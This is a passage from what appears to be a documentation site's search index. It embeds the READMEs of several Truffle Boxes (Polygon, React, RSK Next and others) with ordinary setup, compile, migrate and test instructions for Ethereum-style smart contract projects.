dependencies.\\n ```javascript\\n truffle unbox pet-shop\\n ```\\n\\n3. Run the development console.\\n ```javascript\\n truffle develop\\n ```\\n\\n4. Compile and migrate the smart contracts. Note inside the development console we don't preface commands with `truffle`.\\n ```javascript\\n compile\\n migrate\\n ```\\n\\n5. Run the `liteserver` development server (outside the development console) for front-end hot reloading. Smart contract changes must be manually recompiled and migrated.\\n ```javascript\\n // Serves the front-end on http://localhost:3000\\n npm run dev\\n ```\\n\\n**NOTE**: This box is not a complete dapp, but the starting point for the [Pet Shop tutorial](http://truffleframework.com/tutorials/pet-shop). You'll need to complete that for this to function.\\n\\n## FAQ\\n\\n* __How do I use this with the EthereumJS TestRPC?__\\n\\n It's as easy as modifying the config file! [Check out our documentation on adding network configurations](http://truffleframework.com/docs/advanced/configuration#networks). Depending on the port you're using, you'll also need to update line 16 of `src/js/app.js`.\\n\"","title":"Index"},{"location":"boxes/polygon/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS polygon-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b'# Polygon Box\\n\\n- [Requirements](#requirements)\\n- [Installation](#installation)\\n- [Setup](#setup)\\n * [Using the .env File](#using-the-env-file)\\n * [New Configuration File](#new-configuration-file)\\n * [New Directory Structure for Artifacts](#new-directory-structure-for-artifacts)\\n- [Polygon PoS Chain](#polygon-pos-chain)\\n * [Compiling](#compiling)\\n * [Migrating](#migrating)\\n * [Paying For Migrations](#paying-for-migrations)\\n * [Basic Commands](#basic-commands)\\n * [Testing](#testing)\\n * [Communication Between Ethereum and Polygon PoS Chains](#communication-between-ethereum-and-polygon-pos-chains)\\n- [Support](#support)\\n\\n Table of contents generated with markdown-toc \\n\\n\\nThis Truffle Polygon box provides you with the boilerplate structure necessary to start coding for Polygon\\'s Ethereum L2 solution, the Polygon PoS chain (previously called the Matic PoS chain). For detailed information on how the Polygon PoS chain works, please see their documentation [here](https://docs.matic.network/docs/develop/getting-started).\\n\\nAs a starting point, this box contains only the SimpleStorage Solidity contract. Including minimal code was a conscious decision as this box is meant to provide the initial building blocks needed to get to work on Polygon PoS without pushing developers to write any particular sort of application. With this box, you will be able to compile, migrate, and test Solidity code against several instances of Polygon PoS networks.\\n\\nPolygon\\'s L2 solution is fully compatible with the EVM. This means you will not need a new compiler to deploy Solidity contracts, and should be able to add your own Solidity contracts to this project. The main difference developers will encounter is in accessing and interacting with the Polygon PoS network. Additionally, Polygon offers multiple ways for dapp developers to implement communication between Ethereum (\"Layer 1\") and Polygon PoS. Further information about how to enable Ethereum-Polygon communication can be found in the Polygon documentation [here](https://docs.matic.network/docs/develop/ethereum-matic/getting-started).\\n\\n_A note about naming: The Polygon ecosystem was previously called Matic Network. The chain to which we\\'ll be deploying in this Truffle Box is now called the Polygon PoS chain. We have named this box the Polygon Box because we expect to include the ability to deploy to future Polygon chains in addition to what is presented here as an initial proof-of-concept, and developers using this Polygon Box may find themselves incorporating additional aspects of the Polygon ecosystem in their work._\\n\\n## Requirements\\n\\nThe Polygon box has the following requirements:\\n\\n- [Node.js](https://nodejs.org/) 10.x or later\\n- [NPM](https://docs.npmjs.com/cli/) version 5.2 or later\\n- Windows, Linux or MacOS\\n\\nHelpful, but optional:\\n- An [Infura](https://infura.io/) account and Project ID\\n- A [MetaMask](https://metamask.io/) account\\n\\n## Installation\\n\\n```bash\\n$ truffle unbox polygon\\n```\\n\\n## Setup\\n\\n### Using the env File\\n\\nYou will need at least one mnemonic to use with the network. The `.dotenv` npm package has been installed for you, and you will need to create a `.env` file for storing your mnemonic and any other needed private information.\\n\\nThe `.env` file is ignored by git in this project, to help protect your private data. In general, it is good security practice to avoid committing information about your private keys to github. The `truffle-config.polygon.js` file expects a `MNEMONIC` value to exist in `.env` for running migrations on the networks listed in `truffle-config.polygon.js`.\\n\\nIf you are unfamiliar with using `.env` for managing your mnemonics and other keys, the basic steps for doing so are below:\\n\\n1) Use `touch .env` in the command line to create a `.env` file at the root of your project.\\n2) Open the `.env` file in your preferred IDE\\n3) Add the following, filling in your own mnemonic and Infura project key:\\n\\n```\\nMNEMONIC=\" \"\\nINFURA_PROJECT_ID=\" \"\\n```\\n\\n4) As you develop your project, you can put any other sensitive information in this file. You can access it from other files with `require(\\'dotenv\\').config()` and refer to the variable you need with `process.env[\\' \\']`.\\n\\n### New Configuration File\\n\\nA new configuration file exists in this project: `truffle-config.polygon.js`. This file contains a reference to the new file location of the `contracts_build_directory` for Polygon PoS contracts and lists several networks that are running the Polygon PoS Layer 2 network instance (see [below](#migrating)).\\n\\nPlease note, the classic `truffle-config.js` configuration file is included here as well, because you will eventually want to deploy contracts to Ethereum as well. All normal truffle commands (`truffle compile`, `truffle migrate`, etc.) will use this config file and save built files to `build/ethereum-contracts`. You can save Solidity contracts that you wish to deploy to Ethereum in the `contracts/ethereum` folder.\\n\\n### New Directory Structure for Artifacts\\n\\nWhen you compile or migrate, the resulting `json` files will be at `build/polygon-contracts/`. This is to distinguish them from any Ethereum contracts you build, which will live in `build/ethereum-contracts `. As we have included the appropriate `contracts_build_directory` in each configuration file, Truffle will know which set of built files to reference!\\n\\n## Polygon PoS Chain\\n\\n### Compiling\\n\\nYou do not need to add any new compilers or settings to compile your contracts for the Polygon PoS chain, as it is fully EVM compatible. The `truffle-config.polygon.js` configuration file indicates the contract and build paths for Polygon-destined contracts.\\n\\nIf you are compiling contracts specifically for the Polygon PoS network, use the following command, which indicates the appropriate configuration file:\\n\\n```\\nnpm run compile:polygon\\n```\\n\\nIf you would like to recompile previously compiled contracts, you can manually run this command with\\n`truffle compile --config=truffle-config.polygon.js` and add the `--all` flag.\\n\\n### Migrating\\n\\nTo migrate on the Polygon PoS network, run `npm run migrate:polygon --network=(polygon_infura_testnet | polygon_infura_mainnet | polygon_testnet | polygon_mainnet)` (remember to choose a network from these options!).\\n\\nAs you can see, you have several Polygon PoS L2 networks to choose from:\\n\\n1) *Infura networks*. Infura is running a testnet node as well as a mainnet node for the Polygon PoS chain. Deployment to these networks requires that you sign up for an Infura account and initiate a project. See the Infura website for [details](https://infura.io/). In the example network configuration, we expect you to have a public Infura project key, which you should indicate in your `.env` file. The following Infura networks are indicated in the `truffle-config.polygon.js` file:\\n\\n - `polygon_infura_testnet`: This is the Infura Polygon PoS testnet.\\n - `polygon_infura_mainnet`: This is the Infura Polygon PoS mainnet. Caution! If you deploy to this network using a connected wallet, the fees are charged in mainnet ETH.\\n\\n2) *Polygon networks* Polygon has provided RPC endpoints for testing and mainnet deployments.\\n\\n - `polygon_testnet`: This is the Polygon PoS testnet, called \"Mumbai\". It is goerli-based.\\n - `polygon_mainnet`: This is the Polygon PoS mainnet. Caution! Deployment requires mainnet ETH. \\n\\n\\nIf you would like to migrate previously migrated contracts on the same network, you can run `truffle migrate --config truffle-config.polygon.js --network= (polygon_infura_testnet | polygon_infura_mainnet | polygon_testnet | polygon_mainnet)` and add the `--reset` flag.\\n\\n\\n### Paying for Migrations\\n\\nTo pay for your deployments, you will need to have an account with ETH available to spend. You will need your mnemomic phrase (saved in the `.env` file or through some other secure method). The first account generated by the seed needs to have the ETH you need to deploy. For reference, the Polygon PoS testnets are based in goerli, so you should be able to use goerli ETH.\\n\\nIf you do not have a wallet with funds to deploy, you will need to connect a wallet to at least one of the networks above. For testing, this means you will want to connect a wallet to the `polygon_infura_testnet` or `polygon_testnet` networks. We recommend using [MetaMask](https://metamask.io/).\\n\\nDocumentation for how to set up MetaMask custom networks with the Polygon PoS testnet and mainnet can be found [here](https://docs.matic.network/docs/develop/metamask/config-matic).\\n\\nTo set up a custom network for Infura\\'s testnet and mainnet networks, follow the same steps but point the network to Infura\\'s RPC endpoints (`\"https://polygon-mainnet.infura.io/v3/\" + infuraProjectId` and `\"https://polygon-mumbai.infura.io/v3/\" + infuraProjectId`). The `chainId` values are the same as those on the Polygon networks.\\n\\nTo get testnet ETH to use, visit a faucet like https://goerli-faucet.slock.it/.\\n\\n## Basic Commands\\n\\nThe code here will allow you to compile, migrate, and test your code against a Polygon PoS network instance. The following commands can be run (more details on each can be found in the next section):\\n\\n To compile:\\n ```\\n npm run compile:polygon\\n ```\\n\\n To migrate:\\n ```\\n npm run migrate:polygon --network=(polygon_infura_testnet | polygon_infura_mainnet | polygon_testnet | polygon_mainnet)\\n ```\\n\\n To test:\\n ```\\n npm run test:polygon --network=(polygon_infura_testnet | polygon_infura_mainnet | polygon_testnet | polygon_mainnet)\\n ```\\n\\n\\n### Testing\\n\\nIn order to run the test currently in the boilerplate, use the following command: `npm run test:polygon --network=(polygon_infura_testnet | polygon_infura_mainnet | polygon_testnet | polygon_mainnet)` (remember to choose a network!). The current test file just has some boilerplate tests to get you started. You will likely want to add network-specific tests to ensure your contracts are behaving as expected.\\n\\n### Communication Between Ethereum and Polygon PoS Chains\\n\\nThe information above should allow you to deploy to the Polygon PoS Layer 2 chain. This is only the first step! Once you are ready to deploy your own contracts to function on L1 using L2, you will need to be aware of the [ways in which Layer 1 and Layer 2 interact in the Polygon ecosystem](https://docs.matic.network/docs/develop/ethereum-matic/getting-started). Keep an eye out for additional Truffle tooling and examples that elucidate this second step to full Polygon PoS L2 integration!\\n\\n## Support\\n\\nSupport for this box is available via the Truffle community [here](https://www.trufflesuite.com/community).\\n'","title":"Index"},{"location":"boxes/rapid-box/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS rapid-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b\"# Rapid Box\\nA quick start truffle box to host REST APIs interacting with Smart Contracts.\\n\\n## Key features\\nRapid Box allows your to focus on development of your Smart Contracts and exposing them through an API service, without spending time bridging Contract ABIs into your Express project.\\n\\n- The box takes care of auto-loading Truffle Contract definitions into the `Contracts` helper.\\n- The `Contracts` helper also exposes the `web3` object for RPC operations like `getAccounts`.\\n- Server start accepts RPC endpoint as a parameter making it easy to switch between environments.\\n\\n#### Example\\nExposing an endpoint to get value from SimpleStorage.\\n```\\n// Contracts helper\\nconst Contracts = require('./app/contracts.js');\\n\\n...\\n// Get storage contract value\\napp.get('/storage', function (req, res) {\\n Contracts.SimpleStorage.deployed().then(function (instance) {\\n instance.get.call().then(function (value) {\\n res.json({\\n value: value\\n });\\n });\\n });\\n});\\n```\\n\\n### Setup\\nTo unbox to your workspace.\\n```\\ntruffle unbox hexeight/rapid-box\\n```\\n### Development\\nContinue to use truffle as usual ;)\\n```\\n Compile contracts: truffle compile\\n Migrate contracts: truffle migrate\\n Test contracts: truffle test\\n Run server: npm start -- --rpc \\n```\\n\\n### Run\\nTo run the API service, the RPC endpoint parameter is required. This allows switching RPC endpoints during development.\\n\\nFor example:\\n```\\n# Note that npm start requires the extra -- to different between npm arguments and your script arguments.\\nnpm start -- --rpc http://localhost:8545\\nOR\\nnode server.js --rpc http://localhost:8545\\n```\\n\\n#### Feedback\\nFeel free to send in pull-requests and raise issues with any feedback.\\n\"","title":"Index"},{"location":"boxes/react/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS react-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b\"# React Truffle Box\\n\\nThis box comes with everything you need to start using smart contracts from a react app. This is as barebones as it gets, so nothing stands in your way.\\n\\n## Installation\\n\\nFirst ensure you are in a new and empty directory.\\n\\n1. Run the `unbox` command via `npx` and skip to step 3. This will install all necessary dependencies. A Create-React-App is generated in the `client` directory.\\n ```js\\n npx truffle unbox react\\n ```\\n\\n2. Alternatively, you can install Truffle globally and run the `unbox` command.\\n ```javascript\\n npm install -g truffle\\n truffle unbox react\\n ```\\n\\n3. Run the development console.\\n ```javascript\\n truffle develop\\n ```\\n\\n4. Compile and migrate the smart contracts. Note inside the development console we don't preface commands with `truffle`.\\n ```javascript\\n compile\\n migrate\\n ```\\n\\n5. In the `client` directory, we run the React app. Smart contract changes must be manually recompiled and migrated.\\n ```javascript\\n // in another terminal (i.e. not in the truffle develop prompt)\\n cd client\\n npm run start\\n ```\\n\\n6. Truffle can run tests written in Solidity or JavaScript against your smart contracts. Note the command varies slightly if you're in or outside of the development console.\\n ```javascript\\n // inside the development console.\\n test\\n\\n // outside the development console..\\n truffle test\\n ```\\n\\n7. Jest is included for testing React components. Compile your contracts before running Jest, or you may receive some file not found errors.\\n ```javascript\\n // ensure you are inside the client directory when running this\\n npm run test\\n ```\\n\\n8. To build the application for production, use the build script. A production build will be in the `client/build` folder.\\n ```javascript\\n // ensure you are inside the client directory when running this\\n npm run build\\n ```\\n\\n## FAQ\\n\\n* __How do I use this with the Ganache-CLI?__\\n\\n It's as easy as modifying the config file! [Check out our documentation on adding network configurations](http://truffleframework.com/docs/advanced/configuration#networks). Depending on the port you're using, you'll also need to update line 29 of `client/src/utils/getWeb3.js`.\\n\\n* __Where is my production build?__\\n\\n The production build will be in the `client/build` folder after running `npm run build` in the `client` folder.\\n\\n* __Where can I find more documentation?__\\n\\n This box is a marriage of [Truffle](http://truffleframework.com/) and a React setup created with [create-react-app](https://github.com/facebookincubator/create-react-app/blob/master/packages/react-scripts/template/README.md). Either one would be a great place to start!\\n\"","title":"Index"},{"location":"boxes/react-box-web3-todo/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS react-box-web3-todo CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b\"# React Web3 Redux Todo Truffle Box\\n\\nThis box comes with everything you need to start using smart contracts from a react app. This is as barebones as it gets, so nothing stands in your way.\\n\\n## Installation\\n\\n1. Install Truffle and an Ethereum client. For local development, try EthereumJS TestRPC.\\n ```javascript\\n npm install -g truffle // Version 3.0.5+ required.\\n npm install -g ethereumjs-testrpc\\n ```\\n\\n2. Unbox in the project directory. This will also install the dependencies.\\n ```javascript\\n truffle unbox shanejonas/react-box-web3-todo.git\\n ```\\n\\n3. Compile and migrate the contracts.\\n ```javascript\\n truffle compile\\n truffle migrate\\n ```\\n\\n4. Run the webpack server for front-end hot reloading. For now, smart contract changes must be manually recompiled and migrated.\\n ```javascript\\n npm run start\\n ```\\n\\n5. Jest is included for testing React components and Truffle's own suite is included for smart contracts. Be sure you've compile your contracts before running jest, or you'll receive some file not found errors.\\n ```javascript\\n // Runs Jest for component tests.\\n npm run test\\n\\n // Runs Truffle's test suite for smart contract tests.\\n truffle test\\n ```\\n\\n6. To build the application for production, use the build command. A production build will be in the build_webpack folder.\\n ```javascript\\n npm run build\\n ```\\n\\n## FAQ\\n\\n* __Why is there both a truffle.js file and a truffle-config.js file?__\\n\\n Truffle requires the truffle.js file be named truffle-config on Windows machines. Feel free to delete the file that doesn't correspond to your platform.\\n\\n* __Where is my production build?__\\n\\n The production build will be in the build_webpack folder. This is because Truffle outputs contract compilations to the build folder.\\n\\n* __Where can I find more documentation?__\\n\\n This Truffle Box is a marriage of [Truffle](http://truffleframework.com/) and a React setup created with [create-react-app](https://github.com/facebookincubator/create-react-app/blob/master/packages/react-scripts/template/README.md). Either one would be a great place to start!\\n\"","title":"Index"},{"location":"boxes/react-dapp-boilerplate/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS react-dapp-boilerplate CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b'React DApp Boilerplate - the best UI foundational boilerplate for Ethereum dApps.\\n\\n[Notional.Finance](https://notional.finance) was built with React DApp Boilerplate.'","title":"Index"},{"location":"boxes/react_hooks_box/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS react_hooks_box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b\"# Truffle Box for React using Hooks\\r\\n\\r\\nThis Truffle Box is a base for working with the Truffle framework and React. \\r\\nIt provides a working example of a simple counter contract with corresponding react components.\\r\\n\\r\\n## Prerequisites\\r\\n\\r\\nIn order to run the Truffle box, you will need [Node.js](https://nodejs.org). Version 10.x.y works best and \\r\\nI've found it helpful to install nvm (https://github.com/nvm-sh/nvm). In order install these dependencies, you will also need [Python](https://www.python.org) (version 2.7.x) and\\r\\n[git](https://git-scm.com/downloads). You will also need the [MetaMask](https://metamask.io/) plugin for Chrome.\\r\\n\\r\\n## Building\\r\\n\\r\\n1. Install truffle and an Ethereum client. If you don't have a test environment, I recommend ganache-cli\\r\\n ```bash\\r\\n npm install -g truffle\\r\\n npm install -g ganache-cli\\r\\n ```\\r\\n2. Run your Ethereum client. For Ganache CLI:\\r\\n ```bash\\r\\n ganache-cli\\r\\n ```\\r\\n Note the mnemonic 12-word phrase printed on startup, you will need it later.\\r\\n \\r\\n3. Download the box.\\r\\n ```bash\\r\\n truffle unbox BrannanC/react_hooks_box\\r\\n ```\\r\\n4. Make sure `truffle-config.js` is configured to use your test environment.\\r\\n\\r\\n5. This box is configured to automatically compile and migrate, but you may need to run the command again or\\r\\n `truffle migrate --reset` if there were any snags in the unboxing process.\\r\\n```\\r\\ntruffle compile && truffle migrate\\r\\n```\\r\\n\\r\\n\\r\\n## Configuration\\r\\n1. In order to connect with the Ethereum network, you will need to configure MetaMask\\r\\n2. Log into the `ganache-cli` test accounts in MetaMask, using the 12-word phrase printed earlier. \\r\\nA detailed explaination of how to do this can be found [here](https://truffleframework.com/docs/truffle/getting-started/truffle-with-metamask)\\r\\n3. Point MetaMask to `ganache-cli` by connecting to the network `localhost:7545` \\r\\n\\r\\n\\r\\n## Running\\r\\n\\r\\n1. Dependencies are automatically installed with Yarn. Run the app using Yarn:\\r\\n```bash\\r\\nyarn start\\r\\n```\\r\\nThe app is now served on localhost:3000\\r\\n\\r\\n2. Making sure you have configured MetaMask, visit http://localhost:3000 in your browser.\\r\\n\\r\\n## Testing\\r\\n\\r\\n1. Truffle can run tests written in Solidity or JavaScript against your smart contracts.\\r\\n ```javascript\\r\\n truffle test\\r\\n ```\\r\\n\\r\\n2. Jest is included for testing React components. Compile your contracts before running Jest, or you may receive some file not found errors.\\r\\n ```javascript\\r\\n // ensure you are inside the app directory when running this\\r\\n yarn run test\\r\\n ```\\r\\n\\r\\n## Production\\r\\n1. To build the application for production, use the build script. A production build will be in the `app/build` folder.\\r\\n ```javascript\\r\\n // ensure you are inside the app directory when running this\\r\\n yarn run build\\r\\n ```\\r\\n## FAQ\\r\\n\\r\\n* __Where can I find more documentation?__\\r\\n\\r\\n This box is a marriage of [Truffle](http://truffleframework.com/) and a React setup created with [create-react-app](https://github.com/facebookincubator/create-react-app/blob/master/packages/react-scripts/template/README.md). Either one would be a great place to start!\\r\\n\"","title":"Index"},{"location":"boxes/rsk-next-box/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS rsk-next-box CREATED UPDATED STARS INSTALL ... REPOSITORY GitHub Download Please wait : Fetching readme... b'# RSK Next JS Box\\n\\nThis box comes with everything you need to start using smart contracts from a react app and [Next JS](https://nextjs.org/) on [RSK Blockchain](https://developers.rsk.co/rsk/).\\nIt includes network configurations for Mainnet, Testnet and the SimpleStorage contract as an example to deploy.\\n\\n## Requirements\\n\\n1. [NPM (Node Package Manager)](https://nodejs.org/en/)\\nNode.js and NPM are needed, though both are usually installed at once.\\n\\nGo to [Node.js](https://nodejs.org/en/) if you need to install it.\\n\\n2. Truffle\\n\\nInstall Truffle globally:\\n\\n```shell\\nnpm install -g truffle\\n```\\n\\n## Installation\\n\\n1. Create a new folder.\\nFor example, create the folder `rsk-next`.\\nNavigate to the folder in the terminal.\\n\\n```shell\\nmkdir rsk-next\\ncd rsk-next\\n```\\n\\n2. Run the unbox command. It can take some time, as this will install all necessary dependencies.\\n\\n```shell\\ntruffle unbox rsksmart/rsk-next-box\\n```\\n\\nA Create-React-Next-App is generated in the `app` directory.\\n\\nThis is the result using Windows OS:\\n\\n![truffle unbox](/images/rsk-next-box-01.png)\\n\\n## Development console\\n\\nTruffle has an interactive console that also spawns a development blockchain. This is very useful for compiling, deploying and testing locally.\\n\\n3. Run the development console. This command is successful if you see a list of 10 accounts, a mnemonic and the command prompt is now `truffle(develop)>`\\n\\n```shell\\ntruffle develop\\n```\\n\\nYou will now be in the truffle develop REPL with seeded accounts and their associated private keys listed.\\n\\n```txt\\nC:\\\\RSK\\\\rsk-next>truffle develop\\n\\nTruffle Develop started at http://127.0.0.1:8545/\\n\\nAccounts:\\n(0) 0x1056f747cf4bc7710e178b2aeed4eb8c8506c728\\n(1) 0x45a71c00382c2898b5d6fae69a6f7bfe6edab80c\\n(2) 0x1596384706dc9ac4cca7f50279a4abe591d6c3fe\\n(3) 0x9576d0a496b645baa64f22aceb2328e7468d4113\\n(4) 0xd431572eef7d77584d944c1809398a155e89f830\\n(5) 0x92c111839718fe0800fadccc67068b40b8524a0f\\n(6) 0x6da22b5a027146619bfe6704957f7f36ff029c48\\n(7) 0x2c3a82d8c3993f8c80dcaf91025437bd057df867\\n(8) 0xc43ae7a44f7deb759177b7093f06512a0a9ff5d7\\n(9) 0xe61bf00cd7dce248449cfe58f23a4ef7d542bc0b\\n\\nPrivate Keys:\\n(0) f32f32839fe27ad906b63eafb326f26fed95c231e3c5e33c7cdd08f62db63167\\n(1) ebef990088f27f6ef13b5e52a77d5dcc5a76862a701908c586d01b6fe93562b3\\n(2) 598ccae5e4436fedeb0e798c0d254789c55a63401ebfc3ae8ddde29634ddfcde\\n(3) 09934b80f391e0024b8cb00cd73790fdf64c4d0509e144766414fee317cd3f4e\\n(4) ac745b84b6574b5738d364b43e0d471c9d5107504acc709c90f6f091b78c751b\\n(5) 449654cde095f2349113ef12a93e139b4302bc95adb3619d08adf53dde9b8847\\n(6) c217f12a89c352fc70b5f1bd5742314b4fb1bb1e35cb779fdb3c2390106355db\\n(7) 1d4c74dfa4e99e161130c18cc63938bb120a128cefbf1b9188efc678bf5722cb\\n(8) 0f44e0becf2e090db498a1b747d2a758fcc81fb0241f350d61117a9c6b1fa82e\\n(9) 85218c5eec657470dafeb09e6f7101f91d21bfe822fbeeecfc9275f798662a63\\n\\nMnemonic: virtual valve razor retreat either turn possible student grief engage attract fiber\\n\\n\\xe2\\x9a\\xa0\\xef\\xb8\\x8f Important \\xe2\\x9a\\xa0\\xef\\xb8\\x8f : This mnemonic was created for you by Truffle. It is not secure.\\nEnsure you do not use it on production blockchains, or else you risk losing funds.\\n\\ntruffle(develop)>\\n```\\n\\n4. Take a look at the smart contract `SimpleStorage.sol`. You can check it out in folder `contracts`.\\n\\nThis smart contract has:\\n\\n* A variable `storedData` to store a number\\n* A function `get()` to return the number stored at variable `storedData`\\n* A function `set()` to change the number stored at variable `storedData`\\n\\n5. Compile and migrate the smart contract. Note inside the development console we don\\'t preface commands with truffle.\\n\\n> To make sure you\\'re in the development console, the command prompt must be `truffle(develop)>`\\n\\n```shell\\ncompile\\n```\\nThe `compile output` should be similar to:\\n\\n![truffle compile](/images/rsk-next-box-02.png)\\n\\n```shell\\nmigrate\\n```\\n\\nAnd the `migrate output` should be similar to:\\n\\n![truffle migrate](/images/rsk-next-box-03.png)\\n\\n6. Running contract tests.\\n\\nOur box also comes with the file `TestSimpleStorage.js` for testing the smart contract. You can check it out in the `test` folder.\\n\\nRun this command in the development console:\\n\\n```shell\\ntest\\n```\\n\\nThis `test output` should be similar to:\\n\\n![truffle test](/images/rsk-next-box-04.png)\\n\\nNote the command varies slightly if you\\'re in or outside of the development console.\\n\\n```javascript\\n// inside the development console.\\ntest\\n\\n// outside the development console.\\ntruffle test\\n```\\n\\n## Client side application\\n\\nOur box has done a front end to interact with the smart contract, built using React app and Next JS.\\n\\n7. In another terminal (i.e. not in the truffle develop prompt), go to the `app` directory and run the React app.\\n\\n> Do not close the other terminal, which is running the Truffle development console, because it is our Blockchain simulator.\\n> \\n> If you close it and then open it again, you need to deploy / migrate the smart contract again too!\\n\\n```shell\\ncd app\\nnpm run dev\\n```\\n\\n![npm run dev](/images/rsk-next-box-05.png)\\n\\nThen go to your browser at [http://localhost:3000/](http://localhost:3000/)\\n\\n![localhost port 3000](/images/rsk-next-box-06.png)\\n\\n> Smart contract changes must be manually recompiled and migrated!\\n\\n**NOTE**: This box is the starting point for the RSK tutorial [Using rsk-next-box](https://developers.rsk.co/tutorials/truffle-boxes/rsk-next-box/).\\n\\n## Using RSK networks\\n\\n### Setup an account & get R-BTC\\n\\n- Get an address, learning how works the [account based RSK addresses](https://developers.rsk.co/rsk/architecture/account-based/ \"Account based RSK addresses - RSK Developers Portal\").\\n- For the RSK Testnet, get tR-BTC from [our faucet](https://faucet.testnet.rsk.co/).\\n- For the RSK Mainnet, get R-BTC from [an exchange](https://developers.rsk.co/rsk/rbtc/).\\n\\n### Setup the gas price\\n\\n**Gas** is the internal pricing for running a transaction or contract. When you send tokens, interact with a contract, send R-BTC, or do anything else on the blockchain, you must pay for that computation. That payment is calculated as gas. In RSK, this is paid in **R-BTC**.\\nThe **minimumGasPrice** is written in the block header by miners and establishes the minimum gas price that a transaction should have in order to be included in that block.\\n\\nTo update the **minimumGasPrice** in our project run this query using cURL:\\n\\n**Testnet**\\n\\n```shell\\ncurl https://public-node.testnet.rsk.co/ -X POST -H \"Content-Type: application/json\" \\\\\\n --data \\'{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBlockByNumber\",\"params\":[\"latest\",false],\"id\":1}\\' \\\\\\n > .minimum-gas-price-testnet.json\\n```\\n\\n**Mainnet**\\n\\n```shell\\ncurl https://public-node.rsk.co/ -X POST -H \"Content-Type: application/json\" \\\\\\n --data \\'{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBlockByNumber\",\"params\":[\"latest\",false],\"id\":1}\\' \\\\\\n > .minimum-gas-price-mainnet.json\\n```\\n\\nThis query saved the details of latest block to \\nfile .minimum-gas-price-testnet.json \\nor .minimum-gas-price-mainnet.json, respectively.\\n\\nIn the `truffle-config.js`, we are reading the parameter `minimumGasPrice` in each json file.\\n\\nFor more information about the **Gas** and **minimumGasPrice** please go to [gas page](https://developers.rsk.co/rsk/rbtc/gas/ \"Gas - RSK Developers Portal\").\\n\\n### Connect to RSK\\n\\n1. Copy your mnemonic to `truffle-config.js`\\n\\n```javascript\\n//Put your mnemonic here, be careful not to deploy your mnemonic into production!\\nconst mnemonic = \\'A_MNEMONIC\\';\\n```\\n\\nPlease be aware that we are using `HDWalletProvider` with RSK Networks derivations path:\\n- RSK Mainnet dpath: `m/44\\xe2\\x80\\x99/137\\xe2\\x80\\x99/0\\xe2\\x80\\x99/0`\\n- RSK Testnet dpath: `m/44\\xe2\\x80\\x99/37310\\xe2\\x80\\x99/0\\xe2\\x80\\x99/0`\\n\\nFor more information check [RSKIP57](https://github.com/rsksmart/RSKIPs/blob/master/IPs/RSKIP57.md).\\n\\n2. Run the development console for any RSK network.\\n\\n```shell\\n# Console for Testnet\\ntruffle console --network testnet\\n\\n# Console for Mainnet\\ntruffle console --network mainnet\\n```\\n\\n3. Migrate the smart contracts. We will do it running the below commands directly in the terminal, without using the truffle console now to show to you this alternative.\\n\\n```shell\\ntruffle migrate\\n```\\n\\n4. Update Express JS component. \\n\\nThe component located in the file `web3-util.js` uses the [web3.js](https://web3js.readthedocs.io/) library to interact with the blockchain - writing code that reads and writes data from the blockchain with smart contracts.\\n\\nChoose which network you would like to connect the server to RSK Network \\nand update line 15 of the file `app/utils/web3-util.js`\\n\\n**Testnet**\\n```js \\nconst provider = new Web3.providers.HttpProvider(\"https://public-node.testnet.rsk.co\"); \\n```\\n\\n**Mainnet**\\n```js \\nconst provider = new Web3.providers.HttpProvider(\"https://public-node.rsk.co\");\\n```\\n\\n5. In a terminal, go to the `app` directory and run the React app.\\n\\n```shell\\ncd app\\nnpm run dev\\n```\\n\\nGo to your browser at [http://localhost:3000/](http://localhost:3000/)\\n\\n> Note that when you are connected to an RSK network, you do not need to leave open the Truffle console, because the app is connected via a public node, directly to the network.\\n\\n## Next steps\\n\\n- **Go to tutorial**\\n\\nGo to the tutorial [using rsk-next-box](https://developers.rsk.co/tutorials/truffle-boxes/rsk-next-box/) to learn more about this project. We covered all the steps with more details, explanations, and images.\\n\\n- **Find more documentation**\\n\\nCheck out the [RSK developers portal](https://developers.rsk.co/).\\n\\n- **Do you have questions?**\\n\\nAsk in [RSK chat](https://gitter.im/rsksmart/getting-started).\\n'","title":"Index"},{"location":"boxes/rsk-plant-box/index.html","text":"/* Hide table of contents */ @media screen and (min-width: 60em) { .md-sidebar--secondary { display: none; } } /* Hide navigation */ @media screen and (min-width: 76.25em) { .md-sidebar--primary { display: none; } } /* Hide page header */ .md-content__inner h1 { display: none; } TAGS rsk-plant-box CREATED UPDATED STARS INSTALL 